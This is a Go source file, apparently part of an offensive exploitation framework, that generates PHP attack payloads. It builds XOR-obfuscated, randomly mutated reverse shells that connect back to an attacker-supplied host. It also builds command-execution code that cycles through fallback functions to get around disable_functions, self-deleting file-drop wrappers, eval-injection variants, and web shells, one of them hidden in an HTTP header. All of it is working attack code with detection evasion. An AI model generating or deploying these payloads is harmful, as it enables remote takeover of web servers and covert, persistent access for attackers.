package payload

import "github.com/Chocapikk/pik/sdk"

func init() {
	sdk.SetPHPReverseShell(PHPReverseShellDrop)
	sdk.SetPHPSystem(PHPSystemDrop)
	sdk.SetPHPEvalShell(PHPEvalReverseShell)
	sdk.SetPHPEvalSystem(PHPEvalSystemExec)
}

// --- XOR string literal encoder ---
// Uses PHP's native string XOR operator: 'text1' ^ 'text2'.
// Both strings are printable ASCII, no \x escapes, no function calls,
// no decoder functions. Each encoding produces unique random string pairs.

func phpXorLiteral(s string) string {
	if len(s) == 0 {
		return "''"
	}
	data := []byte(s)
	key := make([]byte, len(data))
	result := make([]byte, len(data))
	for i, b := range data {
		for {
			k := byte(sdk.RandInt(33, 126))
			if k == 37 || k == 39 || k == 92 {
				continue
			}
			r := b ^ k
			if r >= 33 && r <= 126 && r != 37 && r != 39 && r != 92 {
				key[i] = k
				result[i] = r
				break
			}
		}
	}
	v1, v2 := phpVarName(), phpVarName()
	if sdk.RandBool() {
		return sdk.Sprintf(`(($%s='%s').($%s='%s')?~$%s&$%s|$%s&~$%s:'')`,
			v1, string(result), v2, string(key), v1, v2, v1, v2)
	}
	return sdk.Sprintf(`(($%s='%s').($%s='%s')?($%s|$%s)&~($%s&$%s):'')`,
		v1, string(result), v2, string(key), v1, v2, v1, v2)
}

// --- Payload generators ---

// phpReverseShell returns raw PHP code for a reverse shell via proc_open.
func phpReverseShell(lhost string, lport int) string {
	enc := phpXorLiteral
	vFs := phpVarName()
	vPo := phpVarName()
	return sdk.Sprintf(
		`$%s=%s;$%s=%s;$s=$%s("%s",%d);$p=$%s(%s,[0=>$s,1=>$s,2=>$s],$pipes);`,
		vFs, enc("fsockopen"), vPo, enc("proc_open"),
		vFs, lhost, lport, vPo, enc("/bin/bash -i"),
	)
}

// phpExecCmd returns raw PHP code that executes a shell command using
// multiple fallback functions, bypassing disable_functions restrictions.
// Fully polymorphic: XOR string literals, variable names, preamble order,
// function order, condition structure, control flow mutation, dead code
// insertion, and call style are all randomized per generation.
func phpExecCmd(cmd string) string {
	enc := phpXorLiteral

	b64 := sdk.Base64Encode(cmd)
	v := phpVars("d", "c", "f", "r", "p")
	d, c, f, r, p := v["d"], v["c"], v["f"], v["r"], v["p"]

	vEr, vStl, vIua := phpVarName(), phpVarName(), phpVarName()
	preamble := sdk.Shuffle([]string{
		sdk.Sprintf(`$%s=%s;@$%s(0)`, vEr, enc("error_reporting"), vEr),
		sdk.Sprintf(`$%s=%s;@$%s(0)`, vStl, enc("set_time_limit"), vStl),
		sdk.Sprintf(`$%s=%s;@$%s(1)`, vIua, enc("ignore_user_abort"), vIua),
	})

	simple := sdk.Shuffle([]string{"system", "passthru", "shell_exec", "exec"})
	encoded := make([]string, len(simple))
	for i, fn := range simple {
		encoded[i] = enc(fn)
	}

	guard := phpGuard(f, d, enc)
	call := phpCall(f, c, enc)

	vPo := phpVarName()
	vPc := phpVarName()
	vPr := phpVarName()
	vPe := phpVarName()
	vFfi := phpVarName()

	heavy := sdk.Shuffle([]string{
		phpIfWrap(phpCond(r, d, "popen", enc),
			sdk.Sprintf(`$%s=%s;$%s=%s;@$%s($%s($%s,%s));$%s=%s;`,
				vPo, enc("popen"), vPc, enc("pclose"),
				vPc, vPo, c, enc("r"), r, phpOne(enc))),
		phpIfWrap(phpCond(r, d, "proc_open", enc),
			sdk.Sprintf(`$%s=%s;@$%s($%s,[[%s,%s],[%s,%s],[%s,%s]],$%s);$%s=%s;`,
				vPr, enc("proc_open"),
				vPr, c,
				enc("pipe"), enc("r"),
				enc("pipe"), enc("w"),
				enc("pipe"), enc("w"),
				p, r, phpOne(enc))),
		phpIfWrap(phpCond(r, d, "pcntl_exec", enc),
			sdk.Sprintf(`$%s=%s;@$%s(%s,[%s,$%s]);$%s=%s;`,
				vPe, enc("pcntl_exec"),
				vPe, enc("/bin/sh"), enc("-c"), c, r, phpOne(enc))),
		func() string {
			vCd, vSy := phpVarName(), phpVarName()
			return phpIfWrap(sdk.Sprintf(`!$%s`, r),
				sdk.Sprintf(`$%s=%s;`+phpIfWrap(sdk.Sprintf(`$%s(%s)`, vFfi, enc("FFI")),
					sdk.Sprintf(`$%s=%s;$%s=%s;$%s=%s;@$%s::{$%s}(%s)->{$%s}($%s);$%s=%s;`,
						vFfi, enc("FFI"),
						vCd, enc("cdef"),
						vSy, enc("system"),
						vFfi, vCd, enc("int system(const char *command);"),
						vSy, c, r, phpOne(enc))),
					vFfi, enc("class_exists")))
		}(),
	})

	vIni := phpVarName()
	vB64 := phpVarName()

	j1, j2, j3 := phpMaybeJunk(enc), phpMaybeJunk(enc), phpMaybeJunk(enc)

	osCheck := phpIfWrap(
		sdk.Sprintf(`(%s)(PHP_OS,%s)`, enc("stristr"), enc("win")),
		sdk.Sprintf(`$%s.=%s."\n";`, c, enc(" 2>&1")))

	foreachBody := phpIfWrapInner(guard,
		sdk.Sprintf(`%s;$%s=%s;break;`, call, r, phpOne(enc)))

	return sdk.Sprintf(`%s;%s;%s;%s`+
		`$%s=%s;$%s=%s;$%s=@$%s(%s);$%s=$%s('%s');`+
		`%s`+
		`$%s=%s;%s`+
		`foreach([%s,%s,%s,%s] as $%s){%s}`+
		`%s%s%s%s%s`,
		preamble[0], preamble[1], preamble[2], j1,
		vIni, enc("ini_get"), vB64, enc("base64_decode"),
		d, vIni, enc("disable_functions"), c, vB64, b64,
		osCheck,
		r, phpZero(enc), j2,
		encoded[0], encoded[1], encoded[2], encoded[3], f, foreachBody,
		j3, heavy[0], heavy[1], heavy[2], heavy[3],
	)
}

// --- Condition generators (polymorphic) ---

func phpCond(r, d, fn string, enc func(string) string) string {
	parts := sdk.Shuffle([]string{phpNotRan(r), phpExistsEncoded(fn, enc), phpNotDisabledEncoded(d, fn, enc)})
	return parts[0] + "&&" + parts[1] + "&&" + parts[2]
}

func phpGuard(f, d string, enc func(string) string) string {
	exists := phpExistsVar(f, enc)
	notDisabled := phpNotDisabledVar(d, f, enc)
	if sdk.RandBool() {
		return exists + "&&" + notDisabled
	}
	return notDisabled + "&&" + exists
}

func phpCall(f, c string, enc func(string) string) string {
	if sdk.RandBool() {
		return sdk.Sprintf(`$%s($%s)`, f, c)
	}
	vCuf := phpVarName()
	return sdk.Sprintf(`$%s=%s;$%s($%s,$%s)`, vCuf, enc("call_user_func"), vCuf, f, c)
}

func phpNotRan(r string) string {
	switch sdk.RandInt(0, 2) {
	case 0:
		return sdk.Sprintf(`!$%s`, r)
	case 1:
		return sdk.Sprintf(`$%s==0`, r)
	default:
		return sdk.Sprintf(`0==$%s`, r)
	}
}

func phpExistsEncoded(fn string, enc func(string) string) string {
	return sdk.Sprintf(`(%s)(%s)`, enc(phpCheckName()), enc(fn))
}

func phpExistsVar(f string, enc func(string) string) string {
	return sdk.Sprintf(`(%s)($%s)`, enc(phpCheckName()), f)
}

func phpCheckName() string {
	if sdk.RandBool() {
		return "is_callable"
	}
	return "function_exists"
}

func phpNotDisabledEncoded(d, fn string, enc func(string) string) string {
	e := enc(fn)
	stristr := enc("stristr")
	switch sdk.RandInt(0, 2) {
	case 0:
		return sdk.Sprintf(`!(%s)($%s,%s)`, stristr, d, e)
	case 1:
		return sdk.Sprintf(`(%s)($%s,%s)===false`, stristr, d, e)
	default:
		return sdk.Sprintf(`false===(%s)($%s,%s)`, stristr, d, e)
	}
}

func phpNotDisabledVar(d, f string, enc func(string) string) string {
	stristr := enc("stristr")
	switch sdk.RandInt(0, 2) {
	case 0:
		return sdk.Sprintf(`!(%s)($%s,$%s)`, stristr, d, f)
	case 1:
		return sdk.Sprintf(`(%s)($%s,$%s)===false`, stristr, d, f)
	default:
		return sdk.Sprintf(`false===(%s)($%s,$%s)`, stristr, d, f)
	}
}

// --- Control flow mutation ---

// phpIfWrap wraps "if(cond){body}" in a random control flow structure.
func phpIfWrap(cond, body string) string {
	switch sdk.RandInt(0, 3) {
	case 0:
		return sdk.Sprintf(`if(%s){%s}`, cond, body)
	case 1:
		return sdk.Sprintf(`while(%s){%s;break;}`, cond, body)
	case 2:
		return sdk.Sprintf(`for(;%s;){%s;break;}`, cond, body)
	default:
		return sdk.Sprintf(`do{if(!(%s))break;%s}while(0);`, cond, body)
	}
}

// phpIfWrapInner wraps condition+body inside a foreach iteration.
func phpIfWrapInner(cond, body string) string {
	if sdk.RandBool() {
		return sdk.Sprintf(`if(%s){%s}`, cond, body)
	}
	return sdk.Sprintf(`if(!(%s))continue;%s`, cond, body)
}

// phpZero returns a random expression that evaluates to 0.
func phpZero(enc func(string) string) string {
	switch sdk.RandInt(0, 3) {
	case 0:
		return "0"
	case 1:
		return "0|0"
	case 2:
		return sdk.Sprintf(`(%s)('')`, enc("intval"))
	default:
		return sdk.Sprintf(`(%s)('')`, enc("strlen"))
	}
}

// phpOne returns a random expression that evaluates to 1.
func phpOne(enc func(string) string) string {
	switch sdk.RandInt(0, 2) {
	case 0:
		return "1"
	case 1:
		return "!!1"
	default:
		return sdk.Sprintf(`(%s)('1')`, enc("intval"))
	}
}

// phpJunk returns a random dead code statement.
func phpJunk(enc func(string) string) string {
	v := phpVarName()
	switch sdk.RandInt(0, 4) {
	case 0:
		return sdk.Sprintf(`$%s=(%s)(%s,%d)`, v, enc("str_repeat"), enc(sdk.RandAlpha(1)), sdk.RandInt(1, 10))
	case 1:
		return sdk.Sprintf(`$%s=(%s)()`, v, enc("time"))
	case 2:
		return sdk.Sprintf(`$%s=(%s)(%s,%d)`, v, enc("str_pad"), enc(sdk.RandAlpha(1)), sdk.RandInt(1, 10))
	case 3:
		return sdk.Sprintf(`$%s=(%s)(%s)`, v, enc("md5"), enc(sdk.RandAlpha(4)))
	default:
		return sdk.Sprintf(`$%s=(%s)()`, v, enc("microtime"))
	}
}

// phpMaybeJunk returns junk code with a separator, or empty string.
func phpMaybeJunk(enc func(string) string) string {
	if sdk.RandBool() {
		return phpJunk(enc) + ";"
	}
	return ""
}

// --- Helpers ---

func phpVarName() string { return sdk.RandAlpha(6) }

func phpVars(names ...string) map[string]string {
	m := make(map[string]string, len(names))
	for _, n := range names {
		m[n] = sdk.RandAlpha(6)
	}
	return m
}

// --- Drop wrappers (file-based) ---

func phpDrop(code string) string {
	vU := phpVarName()
	vK := phpVarName()
	return sdk.Sprintf(
		`<?php $%s=%s;$%s=%s;$%s($_SERVER[$%s]);%s ?>`,
		vU, phpXorLiteral("unlink"),
		vK, phpXorLiteral("SCRIPT_FILENAME"),
		vU, vK, code)
}

// PHPReverseShellDrop returns a self-deleting PHP reverse shell for file drop.
func PHPReverseShellDrop(lhost string, lport int) string {
	return phpDrop(phpReverseShell(lhost, lport))
}

// PHPSystemDrop returns a self-deleting PHP system exec for file drop.
func PHPSystemDrop(cmd string) string { return phpDrop(phpExecCmd(cmd)) }

// --- Eval wrappers (no tags, for eval() injection) ---

// PHPEvalReverseShell returns raw PHP code for eval() injection.
func PHPEvalReverseShell(lhost string, lport int) string { return phpReverseShell(lhost, lport) }

// PHPEvalSystemExec returns raw PHP code for eval() injection.
func PHPEvalSystemExec(cmd string) string { return phpExecCmd(cmd) }

// --- Webshells ---

// PHPWebShell returns a minimal PHP web shell.
func PHPWebShell(param string) string {
	if param == "" {
		param = "cmd"
	}
	return sdk.Sprintf(`<?php system($_GET["%s"]); ?>`, param)
}

// PHPWebShellPassthru returns a PHP web shell using passthru for binary output.
func PHPWebShellPassthru(param string) string {
	if param == "" {
		param = "cmd"
	}
	return sdk.Sprintf(`<?php passthru($_GET["%s"]); ?>`, param)
}

// PHPWebShellPost returns a PHP web shell that reads from POST body.
func PHPWebShellPost(param string) string {
	if param == "" {
		param = "cmd"
	}
	return sdk.Sprintf(`<?php if(isset($_POST["%s"])){system($_POST["%s"]);} ?>`, param, param)
}

// PHPWebShellStealth returns a PHP web shell hidden in a header.
func PHPWebShellStealth(header string) string {
	if header == "" {
		header = "X-Cmd"
	}
	return sdk.Sprintf(
		`<?php if(isset($_SERVER["HTTP_%s"])){system($_SERVER["HTTP_%s"]);} ?>`,
		phpHeaderKey(header), phpHeaderKey(header),
	)
}

// PHPEval returns a PHP eval shell (POST parameter).
func PHPEval(param string) string {
	if param == "" {
		param = "code"
	}
	return sdk.Sprintf(`<?php eval($_POST["%s"]); ?>`, param)
}

func phpHeaderKey(header string) string {
	result := make([]byte, 0, len(header))
	for _, c := range header {
		switch {
		case c == '-':
			result = append(result, '_')
		case c >= 'a' && c <= 'z':
			result = append(result, byte(c-32))
		default:
			result = append(result, byte(c))
		}
	}
	return string(result)
}
